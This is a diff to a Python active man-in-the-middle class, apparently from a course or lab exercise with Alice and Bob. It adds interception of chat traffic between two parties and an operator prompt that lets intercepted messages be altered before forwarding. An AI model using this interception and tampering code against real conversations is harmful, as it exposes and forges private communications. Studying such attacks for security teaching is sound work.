@@ -7,6 +7,7 @@ class Active_MITM:
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind((self_ip, 8000))
         self.server.listen(5)
+        print(Fore.GREEN + Style.BRIGHT + 'Server up and running! Waiting for connections...\n')
 
         connection, client_address = self.server.accept()
         self.client_handshake(connection)
@@ -39,18 +40,7 @@ class Active_MITM:
             for s in readable:
                 try:
                     incoming_msg = s.recv(4096).decode('UTF-8')
-                    if s is self.client_side:
-                        self.message_queues[self.server_side].put(incoming_msg)
-                        if self.server_side not in self.outputs:
-                            self.outputs.append(self.server_side)
-                        if chat_utils.CHAT_MESSAGE in incoming_msg:
-                            self.handle_new_message(s, incoming_msg)
-                    else:
-                        self.message_queues[self.client_side].put(incoming_msg)
-                        if self.client_side not in self.outputs:
-                            self.outputs.append(self.client_side)
-                        if chat_utils.CHAT_MESSAGE in incoming_msg:
-                            self.handle_new_message(s, incoming_msg)
+                    self.handle_new_message(s, incoming_msg)
                 except ssl.SSLWantReadError:
                     pass
             for s in writable:
@@ -59,7 +49,7 @@ class Active_MITM:
                 except Queue.Empty:
                     self.outputs.remove(s)
                 else:
-                    if next_msg == chat_utils.CHAT_CLOSE:
+                    if next_msg.decode('UTF-8') == chat_utils.CHAT_CLOSE:
                         person = 'Bob'
                         if s is self.server_side:
                             person = 'Alice'
@@ -68,35 +58,61 @@ class Active_MITM:
                         self.close_connection(s)
                         break
                     else:
-                        s.send(next_msg.encode('UTF-8'))
+                        s.send(next_msg)
             for s in exceptional:
                 self.close_connection(s)
 
     def handle_new_message(self, s, data):
-        msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
-        if self.received_message_numbers[s] != msg_num:
-            self.received_message_numbers[s] = msg_num
-            if num_fragments == 1:
-                self.print_message(s, data[28:])
-            else:
-                self.fragment_lists[s].append(data)
+        if data == chat_utils.CHAT_CLOSE:
+            self.send_message(s,data,0)
         else:
-            if num_fragments == fragment_num:
-                self.fragment_lists[s].append(data)
-                received_msg = chat_utils.parse(self.fragment_lists[s])
-                self.print_message(s, received_msg)
-                self.fragment_lists[s].clear()
+            msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
+            if self.received_message_numbers[s] != msg_num:
+                self.received_message_numbers[s] = msg_num
+                if num_fragments == 1:
+                    output_msg = self.print_message(s, data[28:])
+                    self.send_message(s, output_msg, msg_num)
+                else:
+                    self.fragment_lists[s].append(data)
             else:
-                self.fragment_lists[s].append(data)
+                if num_fragments == fragment_num:
+                    self.fragment_lists[s].append(data)
+                    received_msg = chat_utils.parse(self.fragment_lists[s])
+                    output_msg = self.print_message(s, received_msg)
+                    self.send_message(s, output_msg, msg_num)
+                    self.fragment_lists[s].clear()
+                else:
+                    self.fragment_lists[s].append(data)
+
+    def send_message(self, s, message, msg_number):
+        if message == chat_utils.CHAT_CLOSE:
+            msg_blocks = [message.encode('UTF-8')]
+        else:
+            msg_blocks = chat_utils.fragment(message, msg_number)
+        if s is self.client_side:
+            for msg in msg_blocks:
+                self.message_queues[self.server_side].put(msg)
+            if self.server_side not in self.outputs:
+                self.outputs.append(self.server_side)
+        else:
+            for msg in msg_blocks:
+                self.message_queues[self.client_side].put(msg)
+            if self.client_side not in self.outputs:
+                self.outputs.append(self.client_side)
 
     def print_message(self, s, message):
         if self.lastline_type != s:
             print("")
             self.lastline_type = s
         if s is self.client_side:
-            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
+            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.WHITE + Style.BRIGHT + ' Alter message? [Y/N]: ',Fore.CYAN + Style.BRIGHT, end="")
         else:
-            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
+            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.WHITE + Style.BRIGHT + ' Alter message? [Y/N]: ',Fore.CYAN + Style.BRIGHT, end="")
+        response = input()
+        alternate_text = message
+        if (response == 'Y' or response == 'y'):
+            alternate_text = input("Alternate text:  ")
+        return alternate_text
     
     def close_connection(self, s):
         if s in self.outputs:
